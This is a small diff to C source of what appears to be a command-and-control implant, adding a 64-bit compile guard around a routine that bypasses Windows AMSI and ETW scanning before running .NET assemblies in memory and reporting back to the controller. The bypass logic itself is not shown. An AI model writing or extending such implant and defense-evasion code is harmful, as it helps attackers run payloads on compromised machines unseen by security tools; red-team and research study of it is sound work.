@@ -104,6 +104,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     /* if Amsi/Etw bypass is enabled */
     if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
     {
+#if _WIN64
         PUTS( "Try to patch(less) Amsi/Etw" )
 
         PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
@@ -142,6 +143,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
         PackageTransmit( PackageInfo, NULL, NULL );
         PackageInfo = NULL;
+#endif
     }
     else if ( Instance.Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
         /* todo: add memory patching technique */
